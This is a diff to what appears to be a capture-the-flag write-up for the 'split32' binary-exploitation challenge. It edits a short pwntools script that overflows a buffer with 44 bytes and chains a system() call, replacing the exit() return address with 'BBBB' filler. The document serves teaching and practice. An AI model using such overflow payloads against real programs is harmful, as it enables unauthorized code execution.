@@ -69,17 +69,16 @@ pwndbg> cyclic -l 'laaa'
 ```
 
 Final exploit:
-NOTE: I put exit address as return address for a clean execution but you can put 4 random bytes like "BBBB"
+NOTE: Instead of "BBBB" we could use exit() address for a clean termination
 ```python
 from pwn import *
 
 system_addr = 0x8048430
 string_addr = 0x804a030
-exit_addr = 0xf7de96c0
  
 expl = ("A"*44).encode()
 expl += p32(system_addr)
-expl += p32(exit_addr)
+expl += ("BBBB").encode()
 expl += p32(string_addr)
  
 p = process('./split32')
